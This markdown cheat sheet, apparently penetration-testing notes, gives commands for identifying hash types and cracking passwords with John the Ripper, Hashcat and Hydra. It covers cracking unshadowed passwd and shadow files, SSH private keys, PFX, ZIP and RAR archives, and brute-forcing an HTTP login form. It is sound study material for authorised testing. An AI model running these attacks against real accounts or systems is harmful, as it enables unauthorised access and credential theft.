## Intro
This covers all scenarios where password may need to be cracked

## Identifying hashes
```
wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py

python3 hash-id.py
```
It is already installed on Kali as **hash-identifier**
```
hash-identifier
```

## John
### Basic
Create txt file with found hashes / encrypted passwords and hope that John recognizes them.
```
# basic
john foundusers.txt

# use custom wordlist 
john --wordlist=/usr/share/wordlists/rockyou.txt foundusers.txt

# specify format
# E.g: NT, LM, raw-md5, raw-sha1, raw-sha256
john --format=raw-md5 1.txt
```
### passwd and shadow
```
# combine the passwd and shadow files
# unshadow [path to passwd] [path to shadow]
unshadow passwd shadow > unshadow.txt

# Crack the unshadowed file
john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadow.txt
```
### SSH keys
```
# Generate text file john understands
# ssh2john [id_rsa private key file] > [output file]
ssh2john id_rsa > id_rsa_hash.txt

# Crack the output file
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash.txt
```

## PFX files
```
# Generate text file john understands
pfx2john file.pfx > hash.txt

# Crack the output file
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### ZIP & RAR files
If we manage to get a password-protected ZIP file we can use **John the ripper** to crack te password.
```
# Generate text file john understands
# rar2john [rar file] > [output file]
rar2john rarfile.rar > hash.txt
zip2john backup.zip > hash.txt

# Crack the output file
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Hashcat
Hashcat needs to know explicitly what we want to crack, we use "mode" to specify it

https://hashcat.net/wiki/doku.php?id=example_hashes
```
hashcat -m 1710 -o results.txt hash.txt /usr/share/wordlists/rockyou.txt
# -m 1710 – mode
# -o results.txt – results
# hash.txt – hashes to be cracked
# /usr/share/wordlists/rockyou.txt – wordlist
```
### psafe3
```
hashcat -a 0 -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt
```

## Hydra
### HTTP Post form
```
# It may be very slow
hydra <IP> -l <user> -P /usr/share/wordlists/rockyou.txt http-post-form "/hydra/login.php:login=^USER^&haslo=^PASS^:Zle haslo"
```
Hydra can be also used to attack FTP, SSH, SMTP, SMB and more. 
